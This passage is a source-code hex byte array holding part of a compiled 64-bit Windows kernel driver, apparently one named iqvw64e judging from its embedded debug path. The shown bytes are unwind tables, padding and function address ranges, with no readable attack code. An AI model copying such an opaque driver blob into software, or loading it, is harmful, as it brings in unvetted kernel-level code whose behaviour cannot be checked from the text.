    0x75, 0x64, 0x62, 0x75, 0x69, 0x6C, 0x64, 0x5C, 0x33, 0x33, 0x37, 0x32, 0x34, 0x34, 0x5C, 0x73,
    0x64, 0x6B, 0x5C, 0x6E, 0x61, 0x6C, 0x5C, 0x73, 0x72, 0x63, 0x5C, 0x77, 0x69, 0x6E, 0x6E, 0x74,
    0x5F, 0x77, 0x64, 0x6D, 0x5C, 0x64, 0x72, 0x69, 0x76, 0x65, 0x72, 0x5C, 0x6F, 0x62, 0x6A, 0x66,
    0x72, 0x65, 0x5F, 0x77, 0x6E, 0x65, 0x74, 0x5F, 0x41, 0x4D, 0x44, 0x36, 0x34, 0x5C, 0x61, 0x6D,
    0x64, 0x36, 0x34, 0x5C, 0x69, 0x71, 0x76, 0x77, 0x36, 0x34, 0x65, 0x2E, 0x70, 0x64, 0x62, 0x00,
    0x01, 0x06, 0x02, 0x00, 0x06, 0x52, 0x02, 0x30, 0x01, 0x06, 0x02, 0x00, 0x06, 0x32, 0x02, 0x30,
    0x01, 0x06, 0x02, 0x00, 0x06, 0x32, 0x02, 0x30, 0x01, 0x15, 0x05, 0x00, 0x15, 0x74, 0x09, 0x00,
    0x10, 0x34, 0x08, 0x00, 0x04, 0x42, 0x00, 0x00, 0x01, 0x02, 0x01, 0x00, 0x02, 0x30, 0x00, 0x00,
    0x21, 0x00, 0x00, 0x00, 0x10, 0x20, 0x5D, 0x00, 0x33, 0x20, 0x5D, 0x00, 0x34, 0x62, 0x00, 0x00,
    0x21, 0x04, 0x02, 0x00, 0x04, 0x74, 0x11, 0x00, 0x10, 0x20, 0x5D, 0x00, 0x33, 0x20, 0x5D, 0x00,
    0x34, 0x62, 0x00, 0x00, 0x01, 0x0B, 0x03, 0x00, 0x0B, 0x34, 0x10, 0x00, 0x07, 0xC2, 0x00, 0x00,
    0x01, 0x06, 0x02, 0x00, 0x06, 0x32, 0x02, 0x30, 0x01, 0x11, 0x05, 0x00, 0x11, 0x74, 0x0B, 0x00,
    0x0C, 0x34, 0x0A, 0x00, 0x04, 0x62, 0x00, 0x00, 0x01, 0x09, 0x03, 0x00, 0x09, 0x01, 0x26, 0x00,
    0x02, 0x30, 0x00, 0x00, 0x21, 0x00, 0x00, 0x00, 0x50, 0x1D, 0x00, 0x00, 0x67, 0x1D, 0x00, 0x00,
    0x88, 0x62, 0x00, 0x00, 0x21, 0x05, 0x02, 0x00, 0x05, 0x74, 0x09, 0x00, 0x50, 0x1D, 0x00, 0x00,
    0x67, 0x1D, 0x00, 0x00, 0x88, 0x62, 0x00, 0x00, 0x01, 0x0E, 0x03, 0x00, 0x0E, 0x34, 0x08, 0x00,
    0x04, 0x42, 0x00, 0x00, 0x01, 0x04, 0x01, 0x00, 0x04, 0x42, 0x00, 0x00, 0x01, 0x06, 0x02, 0x00,
    0x06, 0x32, 0x02, 0x30, 0x01, 0x06, 0x02, 0x00, 0x06, 0x32, 0x02, 0x30, 0x01, 0x2A, 0x02, 0x00,
    0x1B, 0x01, 0x87, 0x00, 0x01, 0x21, 0x0D, 0x00, 0x21, 0xD4, 0x09, 0x00, 0x1D, 0xC4, 0x0A, 0x00,
    0x17, 0x74, 0x0F, 0x00, 0x13, 0x64, 0x0E, 0x00, 0x0F, 0x54, 0x0D, 0x00, 0x0B, 0x34, 0x0C, 0x00,
    0x07, 0xA2, 0x00, 0x00, 0x01, 0x11, 0x05, 0x00, 0x11, 0x74, 0x04, 0x00, 0x0C, 0x34, 0x09, 0x00,
    0x04, 0x42, 0x00, 0x00, 0x21, 0x00, 0x00, 0x00, 0x20, 0x22, 0x00, 0x00, 0x4E, 0x22, 0x00, 0x00,
    0x28, 0x63, 0x00, 0x00, 0x21, 0x00, 0x02, 0x00, 0x00, 0xE4, 0x04, 0x00, 0x20, 0x22, 0x00, 0x00,
    0x4E, 0x22, 0x00, 0x00, 0x28, 0x63, 0x00, 0x00, 0x21, 0x1D, 0x08, 0x00, 0x1D, 0xE4, 0x04, 0x00,
    0x0F, 0xD4, 0x05, 0x00, 0x08, 0x74, 0x07, 0x00, 0x04, 0x34, 0x0A, 0x00, 0x20, 0x22, 0x00, 0x00,
    0x4E, 0x22, 0x00, 0x00, 0x28, 0x63, 0x00, 0x00, 0x01, 0x16, 0x07, 0x00, 0x16, 0xC4, 0x06, 0x00,
    0x12, 0x64, 0x08, 0x00, 0x0E, 0x54, 0x09, 0x00, 0x07, 0xA2, 0x00, 0x00, 0x01, 0x2A, 0x0B, 0x00,
    0x2A, 0x74, 0x0B, 0x00, 0x1D, 0x34, 0x08, 0x00, 0x13, 0xC4, 0x06, 0x00, 0x0E, 0x64, 0x0A, 0x00,
    0x09, 0x54, 0x09, 0x00, 0x04, 0x62, 0x00, 0x00, 0x21, 0x00, 0x00, 0x00, 0x50, 0x24, 0x00, 0x00,
    0x66, 0x24, 0x00, 0x00, 0x88, 0x63, 0x00, 0x00, 0x21, 0x2A, 0x08, 0x00, 0x2A, 0x74, 0x09, 0x00,
    0x1D, 0x34, 0x06, 0x00, 0x0A, 0x64, 0x08, 0x00, 0x05, 0x54, 0x07, 0x00, 0x50, 0x24, 0x00, 0x00,
    0x66, 0x24, 0x00, 0x00, 0x88, 0x63, 0x00, 0x00, 0x01, 0x04, 0x01, 0x00, 0x04, 0x42, 0x00, 0x00,
    0x21, 0x00, 0x00, 0x00, 0x20, 0x25, 0x00, 0x00, 0x8D, 0x25, 0x00, 0x00, 0xBC, 0x63, 0x00, 0x00,
    0x21, 0x0F, 0x06, 0x00, 0x0F, 0xC4, 0x0A, 0x00, 0x0A, 0x74, 0x0F, 0x00, 0x05, 0x64, 0x0E, 0x00,
    0x20, 0x25, 0x00, 0x00, 0x8D, 0x25, 0x00, 0x00, 0xBC, 0x63, 0x00, 0x00, 0x01, 0x23, 0x0B, 0x00,
    0x23, 0xF4, 0x07, 0x00, 0x18, 0xE4, 0x08, 0x00, 0x13, 0xD4, 0x09, 0x00, 0x0E, 0x54, 0x0D, 0x00,
    0x09, 0x34, 0x0C, 0x00, 0x04, 0xA2, 0x00, 0x00, 0x21, 0x46, 0x06, 0x00, 0x46, 0x64, 0x05, 0x00,
    0x3D, 0x34, 0x06, 0x00, 0x00, 0x74, 0x04, 0x00, 0x70, 0x27, 0x00, 0x00, 0x82, 0x27, 0x00, 0x00,
    0x18, 0x64, 0x00, 0x00, 0x21, 0x00, 0x00, 0x00, 0x70, 0x27, 0x00, 0x00, 0x82, 0x27, 0x00, 0x00,
    0x18, 0x64, 0x00, 0x00, 0x21, 0x05, 0x02, 0x00, 0x05, 0x74, 0x04, 0x00, 0x70, 0x27, 0x00, 0x00,
    0x82, 0x27, 0x00, 0x00, 0x18, 0x64, 0x00, 0x00, 0x01, 0x04, 0x01, 0x00, 0x04, 0x62, 0x00, 0x00,
    0x01, 0x04, 0x01, 0x00, 0x04, 0x62, 0x00, 0x00, 0x21, 0x14, 0x06, 0x00, 0x14, 0x64, 0x06, 0x00,
    0x0D, 0x34, 0x0B, 0x00, 0x00, 0x74, 0x05, 0x00, 0xE0, 0x28, 0x00, 0x00, 0xE9, 0x28, 0x00, 0x00,
    0x68, 0x64, 0x00, 0x00, 0x21, 0x00, 0x00, 0x00, 0xE0, 0x28, 0x00, 0x00, 0xE9, 0x28, 0x00, 0x00,
    0x68, 0x64, 0x00, 0x00, 0x21, 0x05, 0x02, 0x00, 0x05, 0x74, 0x05, 0x00, 0xE0, 0x28, 0x00, 0x00,
    0xE9, 0x28, 0x00, 0x00, 0x68, 0x64, 0x00, 0x00, 0x01, 0x04, 0x01, 0x00, 0x04, 0x62, 0x00, 0x00,
    0x21, 0x00, 0x00, 0x00, 0xC0, 0x29, 0x00, 0x00, 0xF4, 0x29, 0x00, 0x00, 0xCC, 0x64, 0x00, 0x00,
    0x21, 0x00, 0x02, 0x00, 0x00, 0x34, 0x06, 0x00, 0xC0, 0x29, 0x00, 0x00, 0xF4, 0x29, 0x00, 0x00,
    0xCC, 0x64, 0x00, 0x00, 0x21, 0x00, 0x00, 0x00, 0xF4, 0x29, 0x00, 0x00, 0x0F, 0x2A, 0x00, 0x00,
    0xB8, 0x64, 0x00, 0x00, 0x21, 0x05, 0x02, 0x00, 0x05, 0x64, 0x08, 0x00, 0xF4, 0x29, 0x00, 0x00,
    0x0F, 0x2A, 0x00, 0x00, 0xB8, 0x64, 0x00, 0x00, 0x21, 0x05, 0x02, 0x00, 0x05, 0x34, 0x06, 0x00,
    0xC0, 0x29, 0x00, 0x00, 0xF4, 0x29, 0x00, 0x00, 0xCC, 0x64, 0x00, 0x00, 0x01, 0x16, 0x07, 0x00,
    0x16, 0xC4, 0x04, 0x00, 0x11, 0x74, 0x09, 0x00, 0x0C, 0x54, 0x07, 0x00, 0x04, 0x42, 0x00, 0x00,
    0x21, 0x00, 0x00, 0x00, 0xC0, 0x2A, 0x00, 0x00, 0xE0, 0x2A, 0x00, 0x00, 0x1C, 0x65, 0x00, 0x00,
    0x21, 0x00, 0x02, 0x00, 0x00, 0x34, 0x07, 0x00, 0xC0, 0x2A, 0x00, 0x00, 0xE0, 0x2A, 0x00, 0x00,
    0x1C, 0x65, 0x00, 0x00, 0x21, 0x1C, 0x04, 0x00, 0x1C, 0x64, 0x08, 0x00, 0x05, 0x34, 0x07, 0x00,
    0xC0, 0x2A, 0x00, 0x00, 0xE0, 0x2A, 0x00, 0x00, 0x1C, 0x65, 0x00, 0x00, 0x01, 0x0C, 0x03, 0x00,
    0x0C, 0x74, 0x09, 0x00, 0x04, 0x42, 0x00, 0x00, 0x01, 0x14, 0x05, 0x00, 0x14, 0x74, 0x13, 0x00,
    0x0B, 0x34, 0x12, 0x00, 0x07, 0xE2, 0x00, 0x00, 0x01, 0x24, 0x0A, 0x00, 0x24, 0x74, 0x0F, 0x00,
    0x16, 0x64, 0x10, 0x00, 0x12, 0x54, 0x11, 0x00, 0x0E, 0x34, 0x12, 0x00, 0x0A, 0x01, 0x13, 0x00,
    0x21, 0x00, 0x02, 0x00, 0x00, 0xD4, 0x40, 0x00, 0x70, 0x2D, 0x00, 0x00, 0x89, 0x2D, 0x00, 0x00,
    0xB4, 0x65, 0x00, 0x00, 0x21, 0x00, 0x00, 0x00, 0x89, 0x2D, 0x00, 0x00, 0xD0, 0x2E, 0x00, 0x00,
    0x8C, 0x65, 0x00, 0x00, 0x21, 0x16, 0x04, 0x00, 0x16, 0x64, 0x47, 0x00, 0x08, 0xF4, 0x3E, 0x00,
    0x89, 0x2D, 0x00, 0x00, 0xD0, 0x2E, 0x00, 0x00, 0x8C, 0x65, 0x00, 0x00, 0x21, 0xEF, 0x0C, 0x00,
    0xEF, 0xD4, 0x40, 0x00, 0x1B, 0xE4, 0x3F, 0x00, 0x14, 0xC4, 0x41, 0x00, 0x0C, 0x74, 0x42, 0x00,
    0x08, 0x54, 0x46, 0x00, 0x04, 0x34, 0x45, 0x00, 0x70, 0x2D, 0x00, 0x00, 0x89, 0x2D, 0x00, 0x00,
    0xB4, 0x65, 0x00, 0x00, 0x01, 0x19, 0x02, 0x00, 0x0A, 0x01, 0x43, 0x00, 0x01, 0x27, 0x06, 0x00,
    0x27, 0x74, 0x17, 0x00, 0x1F, 0x34, 0x16, 0x00, 0x0A, 0x01, 0x13, 0x00, 0x21, 0x00, 0x00, 0x00,
    0xB0, 0x32, 0x00, 0x00, 0x3A, 0x33, 0x00, 0x00, 0x20, 0x66, 0x00, 0x00, 0x21, 0x00, 0x00, 0x00,
    0x3A, 0x33, 0x00, 0x00, 0x65, 0x33, 0x00, 0x00, 0x0C, 0x66, 0x00, 0x00, 0x21, 0x1D, 0x08, 0x00,
    0x1D, 0xC4, 0x0F, 0x00, 0x18, 0x74, 0x10, 0x00, 0x10, 0x64, 0x15, 0x00, 0x08, 0x54, 0x14, 0x00,
    0x3A, 0x33, 0x00, 0x00, 0x65, 0x33, 0x00, 0x00, 0x0C, 0x66, 0x00, 0x00, 0x21, 0x08, 0x02, 0x00,
    0x08, 0x34, 0x13, 0x00, 0xB0, 0x32, 0x00, 0x00, 0x3A, 0x33, 0x00, 0x00, 0x20, 0x66, 0x00, 0x00,
    0x01, 0x1E, 0x06, 0x00, 0x1E, 0xE4, 0x0D, 0x00, 0x1A, 0xD4, 0x0E, 0x00, 0x0A, 0x01, 0x11, 0x00,
    0x21, 0x00, 0x04, 0x00, 0x00, 0x74, 0x0B, 0x00, 0x00, 0x64, 0x0A, 0x00, 0x40, 0x35, 0x00, 0x00,
    0x4B, 0x35, 0x00, 0x00, 0x64, 0x66, 0x00, 0x00, 0x21, 0x15, 0x06, 0x00, 0x15, 0x74, 0x0B, 0x00,
    0x08, 0x64, 0x0A, 0x00, 0x04, 0x54, 0x09, 0x00, 0x40, 0x35, 0x00, 0x00, 0x4B, 0x35, 0x00, 0x00,
    0x64, 0x66, 0x00, 0x00, 0x01, 0x0B, 0x03, 0x00, 0x0B, 0x34, 0x08, 0x00, 0x07, 0x62, 0x00, 0x00,
    0x21, 0x00, 0x04, 0x00, 0x00, 0x74, 0x0B, 0x00, 0x00, 0x64, 0x0A, 0x00, 0x40, 0x36, 0x00, 0x00,
    0x4B, 0x36, 0x00, 0x00, 0xA4, 0x66, 0x00, 0x00, 0x21, 0x13, 0x06, 0x00, 0x13, 0x74, 0x0B, 0x00,
    0x08, 0x64, 0x0A, 0x00, 0x04, 0x54, 0x09, 0x00, 0x40, 0x36, 0x00, 0x00, 0x4B, 0x36, 0x00, 0x00,
    0xA4, 0x66, 0x00, 0x00, 0x01, 0x0B, 0x03, 0x00, 0x0B, 0x34, 0x08, 0x00, 0x07, 0x62, 0x00, 0x00,
    0x21, 0x00, 0x00, 0x00, 0x40, 0x37, 0x00, 0x00, 0x7E, 0x37, 0x00, 0x00, 0xD4, 0x66, 0x00, 0x00,
    0x21, 0x05, 0x02, 0x00, 0x05, 0x34, 0x0A, 0x00, 0x40, 0x37, 0x00, 0x00, 0x7E, 0x37, 0x00, 0x00,
    0xD4, 0x66, 0x00, 0x00, 0x01, 0x10, 0x03, 0x00, 0x10, 0x74, 0x0B, 0x00, 0x04, 0x62, 0x00, 0x00,
    0x01, 0x22, 0x09, 0x00, 0x22, 0x74, 0x0B, 0x00, 0x1D, 0x64, 0x0A, 0x00, 0x10, 0x54, 0x09, 0x00,
    0x09, 0x34, 0x08, 0x00, 0x04, 0x62, 0x00, 0x00, 0x01, 0x23, 0x0B, 0x00, 0x23, 0xC4, 0x07, 0x00,
    0x1E, 0x74, 0x08, 0x00, 0x13, 0x64, 0x09, 0x00, 0x0E, 0x54, 0x0A, 0x00, 0x09, 0x34, 0x0F, 0x00,
    0x04, 0xA2, 0x00, 0x00, 0x01, 0x11, 0x05, 0x00, 0x11, 0x74, 0x06, 0x00, 0x0C, 0x34, 0x0B, 0x00,
    0x04, 0x62, 0x00, 0x00, 0x21, 0x00, 0x00, 0x00, 0x00, 0x3A, 0x00, 0x00, 0x36, 0x3A, 0x00, 0x00,
    0x48, 0x67, 0x00, 0x00, 0x21, 0x08, 0x02, 0x00, 0x08, 0x64, 0x10, 0x00, 0x00, 0x3A, 0x00, 0x00,
    0x36, 0x3A, 0x00, 0x00, 0x48, 0x67, 0x00, 0x00, 0x01, 0x19, 0x06, 0x00, 0x19, 0x74, 0x0F, 0x00,
    0x14, 0x34, 0x15, 0x00, 0x0C, 0x01, 0x11, 0x00, 0x01, 0x22, 0x0E, 0x00, 0x22, 0xD4, 0x2B, 0x00,
    0x1E, 0xC4, 0x2C, 0x00, 0x1A, 0x74, 0x2D, 0x00, 0x16, 0x64, 0x2E, 0x00, 0x12, 0x54, 0x2F, 0x00,
    0x0E, 0x34, 0x30, 0x00, 0x0A, 0x01, 0x31, 0x00, 0x01, 0x11, 0x05, 0x00, 0x11, 0x74, 0x09, 0x00,
    0x0C, 0x34, 0x08, 0x00, 0x04, 0x42, 0x00, 0x00, 0x01, 0x06, 0x02, 0x00, 0x06, 0x32, 0x02, 0x30,
    0x01, 0x06, 0x02, 0x00, 0x06, 0x32, 0x02, 0x30, 0x01, 0x0A, 0x02, 0x00, 0x0A, 0x32, 0x06, 0x30,
    0x01, 0x0E, 0x02, 0x00, 0x0E, 0x72, 0x0A, 0x30, 0x01, 0x24, 0x06, 0x00, 0x24, 0x74, 0xA3, 0x00,
    0x20, 0x34, 0xA2, 0x00, 0x0A, 0x01, 0x9F, 0x00, 0x01, 0x04, 0x01, 0x00, 0x04, 0x62, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xCD, 0x5D, 0x20, 0xD2, 0x66, 0xD4, 0xFF, 0xFF, 0x32, 0xA2, 0xDF, 0x2D, 0x99, 0x2B, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x10, 0x10, 0x00, 0x00, 0x81, 0x10, 0x00, 0x00, 0xE0, 0x61, 0x00, 0x00, 0x90, 0x10, 0x00, 0x00,
    0xDB, 0x10, 0x00, 0x00, 0xE8, 0x61, 0x00, 0x00, 0xF0, 0x10, 0x00, 0x00, 0x3B, 0x11, 0x00, 0x00,
    0xF0, 0x61, 0x00, 0x00, 0x50, 0x11, 0x00, 0x00, 0x03, 0x12, 0x00, 0x00, 0xF8, 0x61, 0x00, 0x00,
    0x20, 0x12, 0x00, 0x00, 0xE0, 0x12, 0x00, 0x00, 0x08, 0x62, 0x00, 0x00, 0x30, 0x13, 0x00, 0x00,
    0xB8, 0x13, 0x00, 0x00, 0x40, 0x62, 0x00, 0x00, 0xC0, 0x13, 0x00, 0x00, 0x54, 0x1A, 0x00, 0x00,
    0x48, 0x62, 0x00, 0x00, 0x60, 0x1A, 0x00, 0x00, 0x10, 0x1C, 0x00, 0x00, 0x58, 0x62, 0x00, 0x00,
    0x50, 0x1D, 0x00, 0x00, 0x67, 0x1D, 0x00, 0x00, 0x88, 0x62, 0x00, 0x00, 0x67, 0x1D, 0x00, 0x00,
    0x88, 0x1D, 0x00, 0x00, 0x74, 0x62, 0x00, 0x00, 0x88, 0x1D, 0x00, 0x00, 0x9E, 0x1D, 0x00, 0x00,
    0x64, 0x62, 0x00, 0x00, 0xC0, 0x1D, 0x00, 0x00, 0xD6, 0x1D, 0x00, 0x00, 0x94, 0x62, 0x00, 0x00,
    0x70, 0x1E, 0x00, 0x00, 0x92, 0x1E, 0x00, 0x00, 0x9C, 0x62, 0x00, 0x00, 0xA0, 0x1E, 0x00, 0x00,
    0xBF, 0x1E, 0x00, 0x00, 0xA4, 0x62, 0x00, 0x00, 0x30, 0x1F, 0x00, 0x00, 0xEF, 0x1F, 0x00, 0x00,
    0xAC, 0x62, 0x00, 0x00, 0x30, 0x20, 0x00, 0x00, 0xB7, 0x21, 0x00, 0x00, 0xB4, 0x62, 0x00, 0x00,
    0xC0, 0x21, 0x00, 0x00, 0x0D, 0x22, 0x00, 0x00, 0xD4, 0x62, 0x00, 0x00, 0x20, 0x22, 0x00, 0x00,
    0x4E, 0x22, 0x00, 0x00, 0x28, 0x63, 0x00, 0x00, 0x4E, 0x22, 0x00, 0x00, 0x73, 0x23, 0x00, 0x00,
    0x08, 0x63, 0x00, 0x00, 0x73, 0x23, 0x00, 0x00, 0xA1, 0x23, 0x00, 0x00, 0xF4, 0x62, 0x00, 0x00,
    0xA1, 0x23, 0x00, 0x00, 0xBA, 0x23, 0x00, 0x00, 0xE4, 0x62, 0x00, 0x00, 0xC0, 0x23, 0x00, 0x00,
    0x42, 0x24, 0x00, 0x00, 0x3C, 0x63, 0x00, 0x00, 0x50, 0x24, 0x00, 0x00, 0x66, 0x24, 0x00, 0x00,
    0x88, 0x63, 0x00, 0x00, 0x66, 0x24, 0x00, 0x00, 0x0A, 0x25, 0x00, 0x00, 0x68, 0x63, 0x00, 0x00,
    0x0A, 0x25, 0x00, 0x00, 0x0F, 0x25, 0x00, 0x00, 0x58, 0x63, 0x00, 0x00, 0x20, 0x25, 0x00, 0x00,
    0x8D, 0x25, 0x00, 0x00, 0xBC, 0x63, 0x00, 0x00, 0x8D, 0x25, 0x00, 0x00, 0x43, 0x27, 0x00, 0x00,
    0xA0, 0x63, 0x00, 0x00, 0x43, 0x27, 0x00, 0x00, 0x61, 0x27, 0x00, 0x00, 0x90, 0x63, 0x00, 0x00,
    0x70, 0x27, 0x00, 0x00, 0x82, 0x27, 0x00, 0x00, 0x18, 0x64, 0x00, 0x00, 0x82, 0x27, 0x00, 0x00,
    0xCB, 0x27, 0x00, 0x00, 0x04, 0x64, 0x00, 0x00, 0xCB, 0x27, 0x00, 0x00, 0xD0, 0x27, 0x00, 0x00,
    0xF4, 0x63, 0x00, 0x00, 0xD0, 0x27, 0x00, 0x00, 0xA6, 0x28, 0x00, 0x00, 0xD8, 0x63, 0x00, 0x00,
    0xB0, 0x28, 0x00, 0x00, 0xD1, 0x28, 0x00, 0x00, 0x20, 0x64, 0x00, 0x00, 0xE0, 0x28, 0x00, 0x00,
    0xE9, 0x28, 0x00, 0x00, 0x68, 0x64, 0x00, 0x00, 0xE9, 0x28, 0x00, 0x00, 0x2E, 0x29, 0x00, 0x00,
    0x54, 0x64, 0x00, 0x00, 0x2E, 0x29, 0x00, 0x00, 0x33, 0x29, 0x00, 0x00, 0x44, 0x64, 0x00, 0x00,
    0x33, 0x29, 0x00, 0x00, 0xB3, 0x29, 0x00, 0x00, 0x28, 0x64, 0x00, 0x00, 0xC0, 0x29, 0x00, 0x00,
    0xF4, 0x29, 0x00, 0x00, 0xCC, 0x64, 0x00, 0x00, 0xF4, 0x29, 0x00, 0x00, 0x0F, 0x2A, 0x00, 0x00,
    0xB8, 0x64, 0x00, 0x00, 0x0F, 0x2A, 0x00, 0x00, 0x79, 0x2A, 0x00, 0x00, 0xA4, 0x64, 0x00, 0x00,
    0x79, 0x2A, 0x00, 0x00, 0x92, 0x2A, 0x00, 0x00, 0x94, 0x64, 0x00, 0x00, 0x92, 0x2A, 0x00, 0x00,
    0x96, 0x2A, 0x00, 0x00, 0x80, 0x64, 0x00, 0x00, 0x96, 0x2A, 0x00, 0x00, 0xAF, 0x2A, 0x00, 0x00,
    0x70, 0x64, 0x00, 0x00, 0xC0, 0x2A, 0x00, 0x00, 0xE0, 0x2A, 0x00, 0x00, 0x1C, 0x65, 0x00, 0x00,
    0xE0, 0x2A, 0x00, 0x00, 0x49, 0x2B, 0x00, 0x00, 0x04, 0x65, 0x00, 0x00, 0x49, 0x2B, 0x00, 0x00,
    0x5A, 0x2B, 0x00, 0x00, 0xF0, 0x64, 0x00, 0x00, 0x5A, 0x2B, 0x00, 0x00, 0x69, 0x2B, 0x00, 0x00,
    0xE0, 0x64, 0x00, 0x00, 0x70, 0x2B, 0x00, 0x00, 0x5A, 0x2C, 0x00, 0x00, 0x28, 0x65, 0x00, 0x00,
    0x60, 0x2C, 0x00, 0x00, 0x5C, 0x2D, 0x00, 0x00, 0x38, 0x65, 0x00, 0x00, 0x70, 0x2D, 0x00, 0x00,
    0x89, 0x2D, 0x00, 0x00, 0xB4, 0x65, 0x00, 0x00, 0x89, 0x2D, 0x00, 0x00, 0xD0, 0x2E, 0x00, 0x00,
    0x8C, 0x65, 0x00, 0x00, 0xD0, 0x2E, 0x00, 0x00, 0x97, 0x30, 0x00, 0x00, 0x74, 0x65, 0x00, 0x00,
    0x97, 0x30, 0x00, 0x00, 0xC9, 0x30, 0x00, 0x00, 0x64, 0x65, 0x00, 0x00, 0xC9, 0x30, 0x00, 0x00,
    0xEF, 0x30, 0x00, 0x00, 0x50, 0x65, 0x00, 0x00, 0x10, 0x31, 0x00, 0x00, 0xA7, 0x32, 0x00, 0x00,
    0xBC, 0x65, 0x00, 0x00, 0xB0, 0x32, 0x00, 0x00, 0x3A, 0x33, 0x00, 0x00, 0x20, 0x66, 0x00, 0x00,
    0x3A, 0x33, 0x00, 0x00, 0x65, 0x33, 0x00, 0x00, 0x0C, 0x66, 0x00, 0x00, 0x65, 0x33, 0x00, 0x00,
    0x02, 0x35, 0x00, 0x00, 0xEC, 0x65, 0x00, 0x00, 0x02, 0x35, 0x00, 0x00, 0x17, 0x35, 0x00, 0x00,
    0xDC, 0x65, 0x00, 0x00, 0x17, 0x35, 0x00, 0x00, 0x33, 0x35, 0x00, 0x00, 0xCC, 0x65, 0x00, 0x00,
